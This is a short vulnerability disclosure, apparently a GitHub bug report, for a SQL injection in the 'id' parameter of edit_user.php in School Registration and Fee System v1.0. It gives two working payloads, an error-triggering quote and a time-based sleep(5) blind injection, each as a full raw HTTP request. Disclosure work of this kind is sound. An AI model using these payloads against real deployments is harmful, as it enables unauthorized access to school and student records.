# School Registration and Fee System v1.0 has SQL injection

BUG_Author:Forsan

Vulnerability File: /bilal final/edit_user.php

GET parameter 'id' exists SQL injection vulnerability

Payload1: http://localhost/bilal%20final/edit_user.php?id=3%27

```
GET /bilal%20final/edit_user.php?id=3%27 HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=1n5lla2368pm1f9736l2bfp58a
Connection: close
```

An error occurred in the sql statement

![image](https://github.com/forsean/picture/blob/main/error.png)

Payload2: http://localhost/bilal%20final/edit_user.php?id=3%27%20and%20(select%204%20from%20(select(sleep(5)))a)--%20b

```
GET /bilal%20final/edit_user.php?id=3%27%20and%20(select%204%20from%20(select(sleep(5)))a)--%20b HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=1n5lla2368pm1f9736l2bfp58a
Connection: close
```

The server's response time is 5 seconds

![image](https://github.com/forsean/picture/blob/main/five.png)
